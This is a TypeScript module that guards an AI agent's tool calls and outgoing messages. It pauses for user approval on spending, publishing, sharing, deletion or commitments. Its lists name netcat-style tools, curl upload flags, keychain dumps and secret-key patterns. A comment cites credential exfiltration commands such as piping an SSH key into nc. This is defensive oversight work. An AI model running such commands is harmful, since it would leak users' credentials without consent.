// Hard stops (docs/design/dialogs-pane.md §6 "delegate"): what always asks you,
// whatever the agent thinks. Two readers: the Worker's tool calls (money,
// publish, share, delete) and the Speaker's outgoing text (share,
// commit-on-behalf). Both err toward asking: a stop that asks once too often
// costs a key press, one that misses cannot be undone. Pure.
import type { DgStop } from './contract'
import { isCredentialPath, isInside, isUnresolvable, resolvePath } from './paths'
import { base, gitSub, inputTargets, operands, readCommand, seeThrough, type Simple } from './shell'

export const DG_STOPS = ['money', 'publish', 'share', 'delete', 'commit-on-behalf'] as const satisfies readonly DgStop[]

export const STOP_LABEL = {
  money: 'money (spending, payment details)',
  publish: 'publish (push, merge, deploy, publishing)',
  share: 'share (files, credentials, personal data, code out of the repo)',
  delete: 'delete (outside the worktree)',
  'commit-on-behalf': 'commit-on-behalf (deadlines, prices)',
} as const satisfies Record<DgStop, string>

/** One stop a call or a message meets, and what it is about, for the question and the ledger. */
export type StopHit = { stop: DgStop; what: string }

/** A tool call as the hooks see it: the tool and its arguments. */
export type ToolUse = { tool: string; input: Readonly<Record<string, unknown>> }

/** Where the Worker stands: its worktrees (the first is its cwd) and the home directory. */
export type Place = { worktrees: readonly string[]; home: string }

const str = (v: unknown): string => (typeof v === 'string' ? v : '')

const short = (text: string, max = 80) => (text.length <= max ? text : `${text.slice(0, max - 1)}…`)

// --- card numbers: the payment details a money stop guards ---

function luhn(digits: string): boolean {
  let sum = 0
  for (let i = 0; i < digits.length; i++) {
    let d = Number(digits[digits.length - 1 - i])
    if (i % 2 === 1) {
      d *= 2
      if (d > 9) d -= 9
    }
    sum += d
  }
  return sum % 10 === 0
}

/** A payment card number (13–19 digits, spaces or dashes allowed, Luhn-valid). */
export function hasCardNumber(text: string): boolean {
  for (const match of text.matchAll(/\b\d(?:[ -]?\d){12,18}\b/g)) {
    const digits = match[0].replace(/[ -]/g, '')
    if (digits.length >= 13 && digits.length <= 19 && luhn(digits)) return true
  }
  return false
}

// --- Bash ---

const PUBLISH_SUBS: Record<string, readonly string[]> = {
  npm: ['publish', 'unpublish', 'deprecate', 'dist-tag'],
  pnpm: ['publish'],
  yarn: ['publish', 'npm'],
  bun: ['publish'],
  uv: ['publish'],
  poetry: ['publish'],
  twine: ['upload'],
  cargo: ['publish', 'yank'],
  gem: ['push', 'yank'],
  docker: ['push'],
  podman: ['push'],
  helm: ['install', 'upgrade', 'push', 'uninstall', 'rollback'],
  kubectl: ['apply', 'create', 'delete', 'replace', 'patch', 'rollout', 'scale', 'edit', 'set', 'run', 'expose'],
  terraform: ['apply', 'destroy', 'import'],
  tofu: ['apply', 'destroy'],
  pulumi: ['up', 'destroy'],
  flux: ['reconcile', 'resume', 'suspend', 'create', 'delete'],
  vercel: ['deploy', '--prod', 'promote'],
  netlify: ['deploy'],
  fly: ['deploy'],
  flyctl: ['deploy'],
  firebase: ['deploy'],
  wrangler: ['deploy', 'publish'],
  serverless: ['deploy'],
  sls: ['deploy'],
  make: ['deploy', 'release', 'publish', 'push'],
  just: ['deploy', 'release', 'publish', 'push'],
}

/** gh / glab: subcommand pairs that put something in front of other people. */
const FORGE_PUBLISH = ['pr create', 'pr merge', 'pr comment', 'pr review', 'pr edit', 'pr close', 'pr ready', 'mr create', 'mr merge', 'mr note', 'release create', 'release upload', 'repo create', 'repo edit', 'repo delete', 'issue create', 'issue comment', 'issue close', 'workflow run', 'run rerun', 'gist create', 'secret set', 'variable set']

const NET_TOOLS = new Set(['curl', 'wget', 'http', 'https', 'httpie', 'xh', 'aria2c'])
const UPLOAD_FLAGS = ['-F', '--form', '-T', '--upload-file', '--post-file', '--body-file']
const PAYMENT_HOSTS = /(api\.stripe\.com|paypal\.com|braintreegateway|adyen\.com|checkout\.com|yookassa|cloudpayments|tinkoff\.ru\/v2|robokassa|squareup\.com|razorpay|mollie\.com|paddle\.com|lemonsqueezy)/i
const DELETERS = new Set(['rm', 'rmdir', 'unlink', 'shred', 'srm', 'trash', 'trash-put'])

/** Paths a deleting command names that are not inside a worktree (or cannot be told). */
function outsidePaths(words: readonly string[], place: Place): string[] {
  const cwd = place.worktrees[0] ?? '/'
  return words.filter(word => {
    if (isUnresolvable(word)) return true
    const path = resolvePath(word, cwd, place.home)
    // A glob is judged by where it starts: `/tmp/*` is outside, `src/*` inside.
    return !isInside(path.replace(/\/[^/]*[*?[][^/]*$/, ''), place.worktrees)
  })
}

function bashHits(simple: Simple, place: Place): StopHit[] {
  const name = base(simple[0] ?? '')
  const line = short(simple.join(' '))
  const hits: StopHit[] = []
  const args = simple.slice(1)

  if (name === 'git') {
    const git = gitSub(simple)
    if (git === null) return hits
    if (git.sub === 'push' || git.sub === 'send-email' || git.sub === 'request-pull') hits.push({ stop: git.sub === 'push' ? 'publish' : 'share', what: line })
    if (git.sub === 'branch' && git.rest.some(word => word === '-D' || word === '-d' || word === '--delete')) hits.push({ stop: 'delete', what: line })
    if (git.sub === 'tag' && git.rest.some(word => word === '-d' || word === '--delete')) hits.push({ stop: 'delete', what: line })
    if (git.sub === 'worktree' && (git.rest[0] === 'remove' || git.rest[0] === 'prune')) hits.push({ stop: 'delete', what: line })
    if (git.sub === 'update-ref' && git.rest.includes('-d')) hits.push({ stop: 'delete', what: line })
    if (git.sub === 'stash' && (git.rest[0] === 'drop' || git.rest[0] === 'clear')) hits.push({ stop: 'delete', what: line })
    // The stash and the refs outside the worktree are shared with your checkout.
    if (git.sub === 'clean' && git.dirs.length > 0 && outsidePaths(git.dirs, place).length > 0) hits.push({ stop: 'delete', what: line })
    return hits
  }
  if (name === 'gh' || name === 'glab') {
    const pair = operands(simple).slice(0, 2).join(' ')
    if (FORGE_PUBLISH.includes(pair)) hits.push({ stop: pair === 'gist create' ? 'share' : 'publish', what: line })
    if (pair.startsWith('api ') || operands(simple)[0] === 'api') {
      const method = args[args.findIndex(word => word === '-X' || word === '--method') + 1]
      if (args.some(word => word === '-X' || word === '--method') && method !== undefined && method.toUpperCase() !== 'GET') hits.push({ stop: 'publish', what: line })
      if (args.some(word => word === '-f' || word === '-F' || word === '--field' || word === '--raw-field' || word === '--input')) hits.push({ stop: 'publish', what: line })
    }
    return hits
  }
  const subs = PUBLISH_SUBS[name]
  if (subs !== undefined) {
    const sub = operands(simple)[0] ?? ''
    // `vercel` alone deploys; `docker buildx build --push` pushes.
    const isPublish = subs.includes(sub) || (name === 'vercel' && sub === '') || args.includes('--push') || (name === 'vercel' && args.includes('--prod'))
    if (isPublish) hits.push({ stop: 'publish', what: line })
    return hits
  }
  if (name === 'ssh' || name === 'ansible-playbook' || name === 'ansible') hits.push({ stop: 'publish', what: line })
  if (name === 'aws' || name === 'gcloud' || name === 'az') {
    const words = operands(simple).join(' ')
    if (/\b(deploy|create|delete|put|update|apply|cp|sync|mv|rm|publish|invoke)\b/.test(words)) hits.push({ stop: 'publish', what: line })
  }
  if (name === 'scp' || name === 'rsync' || name === 'sftp' || name === 'ftp') {
    if (operands(simple).some(word => /^[^/]*:/.test(word) && !word.startsWith('./'))) hits.push({ stop: 'share', what: line })
  }
  if (name === 'nc' || name === 'ncat' || name === 'netcat' || name === 'socat' || name === 'telnet' || name === 'mail' || name === 'mailx' || name === 'sendmail' || name === 'mutt') {
    hits.push({ stop: 'share', what: line })
  }
  if (NET_TOOLS.has(name)) {
    // A file sent as the body or a form part: `-F f=@x`, `-d @x`, `-T x`.
    if (args.some(word => UPLOAD_FLAGS.includes(word) || word.startsWith('@') || /^-[dF]@/.test(word) || /=@/.test(word))) {
      hits.push({ stop: 'share', what: line })
    }
    const url = args.find(word => /^https?:\/\//.test(word)) ?? ''
    const sends = args.some(word => /^-(X|-request)$/.test(word)) || args.some(word => /^(-d|--data.*|--json|-F|--form)$/.test(word))
    if (PAYMENT_HOSTS.test(url) && sends) hits.push({ stop: 'money', what: line })
  }
  if (name === 'stripe' && !['listen', 'logs', 'login', 'help', 'version', 'config'].includes(operands(simple)[0] ?? '') && !/\b(list|retrieve|get)\b/.test(args.join(' '))) {
    hits.push({ stop: 'money', what: line })
  }
  if (name === 'security' && /^find-.*password$|^dump-keychain$/.test(args[0] ?? '')) hits.push({ stop: 'share', what: line })
  if (DELETERS.has(name)) {
    const outside = outsidePaths(operands(simple), place)
    if (outside.length > 0) hits.push({ stop: 'delete', what: `${name} ${short(outside.join(' '), 60)}` })
  }
  if (name === 'find' && (args.includes('-delete') || args.some((word, i) => word === '-exec' && DELETERS.has(base(args[i + 1] ?? ''))))) {
    const roots = args.filter((word, i) => i < (args.findIndex(one => one.startsWith('-')) + 1 || args.length) && !word.startsWith('-'))
    if (outsidePaths(roots.length === 0 ? ['.'] : roots, place).length > 0) hits.push({ stop: 'delete', what: line })
  }
  if (name === 'mv' && operands(simple).at(-1) === '/dev/null') hits.push({ stop: 'delete', what: line })
  const isCredential = (word: string) => isCredentialPath(resolvePath(word, place.worktrees[0] ?? '/', place.home))
  if ((name === 'cat' || name === 'less' || name === 'head' || name === 'tail' || name === 'cp' || name === 'base64' || name === 'xxd') && operands(simple).some(isCredential)) {
    hits.push({ stop: 'share', what: line })
  }
  // Fed in through `<`, whatever the command: `nc host 9 < ~/.ssh/id_rsa`, `python3 up.py <~/.aws/credentials`.
  if (inputTargets(simple).some(isCredential)) hits.push({ stop: 'share', what: line })
  return hits
}

// --- MCP and the rest ---

const MONEY_TOOL = /(pay|charge|purchase|checkout|invoice|billing|subscri|order|buy|refund|transfer|wallet|payout)/i

/** The stops a Worker's tool call meets; empty when it may run without asking. */
export function callHits(use: ToolUse, place: Place): StopHit[] {
  const hits: StopHit[] = []
  const text = JSON.stringify(use.input)
  if (hasCardNumber(text)) hits.push({ stop: 'money', what: `${use.tool} with a card number` })
  switch (use.tool) {
    case 'Bash': {
      // The grant's reader, launchers seen through: `uv run gh pr merge` is `gh pr merge` here too.
      const reading = seeThrough(readCommand(str(use.input.command)))
      for (const simple of reading.commands) hits.push(...bashHits(simple, place))
      // Nested past what the reader follows: it could do anything a Bash command can, so it asks for each.
      if (reading.isTooDeep) {
        const what = 'commands nested deeper than the guard reads'
        hits.push({ stop: 'money', what }, { stop: 'publish', what }, { stop: 'share', what }, { stop: 'delete', what })
      }
      break
    }
    case 'Read':
    case 'NotebookRead': {
      const path = resolvePath(str(use.input.file_path), place.worktrees[0] ?? '/', place.home)
      if (isCredentialPath(path)) hits.push({ stop: 'share', what: `read ${path}` })
      break
    }
    default:
      if (use.tool.startsWith('mcp__') && MONEY_TOOL.test(use.tool)) hits.push({ stop: 'money', what: use.tool })
  }
  // One question per stop: the first thing it is about.
  return DG_STOPS.flatMap(stop => hits.filter(hit => hit.stop === stop).slice(0, 1))
}

// --- the Speaker's outgoing text ---

const SECRETS: readonly RegExp[] = [
  /\bsk-[A-Za-z0-9_-]{20,}/,
  /\b[sr]k_(live|test)_[A-Za-z0-9]{10,}/,
  /\bgh[pousr]_[A-Za-z0-9]{30,}/,
  /\bgithub_pat_[A-Za-z0-9_]{20,}/,
  /\bxox[abprs]-[A-Za-z0-9-]{10,}/,
  /\bAKIA[0-9A-Z]{16}\b/,
  /\bAIza[0-9A-Za-z_-]{35}\b/,
  /-----BEGIN [A-Z ]*PRIVATE KEY-----/,
  /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/,
  /\b\d{8,10}:[A-Za-z0-9_-]{35}\b/,
  /\b(password|passwd|pwd|passphrase|token|secret|api[_-]?key|пароль|токен)\s*[:=]\s*\S{6,}/i,
]
const EMAIL = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/
const PHONE = /(?:\+\d[\d\s()-]{9,}\d|\b8[\s(-]*9\d{2}[\s)-]*\d{3}[\s-]*\d{2}[\s-]*\d{2}\b)/
const IBAN = /\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b/
const LOCAL_PATH = /(^|[\s"'(`])(\/Users\/|\/home\/|~\/|[A-Z]:\\)/
const CODE_FENCE = /```[^\n]*\n(?:[^\n]*\n){3,}?[^\n]*```/

const PRICE = /([$€£₽¥]\s?\d|\d[\d\s.,]*\s?([$€£₽¥]|k\b|usd|eur|rub|руб|тыс|р\.|долл|евро|bucks|dollars|euros))/i
const WHEN =
  /\b(today|tonight|tomorrow|by (mon|tue|wed|thu|fri|sat|sun|end of|the end|eod|eow|next)|deadline|eod|eow|next week|monday|tuesday|wednesday|thursday|friday|saturday|sunday|\d{1,2}:\d{2}|\d{1,2}(am|pm)|(?<![\d.])\d{1,2}[./]\d{1,2}(?:[./]\d{2,4})?(?![.\d])|in \d+ (hours?|days?|weeks?))\b|(сегодня|завтра|послезавтра|до (понедельника|вторника|среды|четверга|пятницы|субботы|воскресенья|конца|вечера|утра)|к (понедельнику|вторнику|среде|четвергу|пятнице|субботе|воскресенью|вечеру|утру)|дедлайн|срок|на этой неделе|на следующей неделе|через \d+ (час|дн|недел))/i

/**
 * The stops a message the Speaker is about to send meets: share (credentials,
 * personal data, local files, code) and commit-on-behalf (a price, or a time
 * or date the message agrees to).
 */
export function textHits(text: string): StopHit[] {
  const hits: StopHit[] = []
  const quote = `"${short(text.replace(/\s+/g, ' '), 60)}"`
  if (SECRETS.some(re => re.test(text))) hits.push({ stop: 'share', what: `a credential in ${quote}` })
  else if (hasCardNumber(text) || IBAN.test(text)) hits.push({ stop: 'share', what: `payment details in ${quote}` })
  else if (EMAIL.test(text) || PHONE.test(text)) hits.push({ stop: 'share', what: `personal data in ${quote}` })
  else if (LOCAL_PATH.test(text)) hits.push({ stop: 'share', what: `a local file path in ${quote}` })
  else if (CODE_FENCE.test(text)) hits.push({ stop: 'share', what: `code in ${quote}` })
  if (PRICE.test(text) || WHEN.test(text)) hits.push({ stop: 'commit-on-behalf', what: quote })
  return hits
}

/** Splits hits into the ones to ask about and the ones skipped. */
export function partition(hits: readonly StopHit[], skipped: readonly DgStop[]): { ask: StopHit[]; skipped: StopHit[] } {
  return { ask: hits.filter(hit => !skipped.includes(hit.stop)), skipped: hits.filter(hit => skipped.includes(hit.stop)) }
}

/** The engine dialog's question: `HARD STOP publish: git push origin feat/x?` (several: joined). */
export function stopQuestion(hits: readonly StopHit[], who: string): string {
  const names = hits.map(hit => hit.stop).join(' + ')
  const what = hits.map(hit => hit.what).join('; ')
  return `HARD STOP ${names} (${who}): ${short(what, 160)}. Allow it?`
}
